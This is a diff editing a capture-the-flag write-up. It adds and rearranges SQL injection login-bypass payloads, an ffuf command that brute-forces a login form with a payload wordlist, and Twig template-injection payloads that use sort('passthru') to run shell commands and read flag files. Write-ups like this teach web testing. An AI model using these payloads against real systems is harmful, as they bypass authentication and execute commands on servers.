@@ -172,7 +172,7 @@ I found that the following payload to the username field works too:
 
 #### Further testing
 
-Utilizing `ffuf`, I found that the following payloads works too:
+Utilizing `ffuf`:
 
 > Note: In MySQL, `#` is a comment
 
@@ -186,9 +186,11 @@ $ ffuf -u http://<target>functions.php -w auth_wordlist.txt -X POST -d "username
 
 There should be some output(s) that returns a larger response size than the rest.  The `-fs` flag can be used to filter this.
 
+Found payload:
+
 ```sql
-' OR 'x'='x';-- -
 ' OR 'x'='x'#  
+' OR 'x'='x';-- - // manually tested
 ```
 
 {% embed url="https://github.com/payloadbox/sql-injection-payload-list" %}
@@ -330,6 +332,13 @@ The payloads above doesn't seem to work. Finally, I found a working payload afte
 
 ```twig
 {{['id',""]|sort('passthru')}} 
+```
+
+**Retrieving the flag:**
+
+```twig
+{{['ls /flags',""]|sort('passthru')}} 
+{{['cat /flags/xxxx.txt',""]|sort('passthru')}} 
 ```
 
 {% embed url="https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html#ssti-in-go" %}
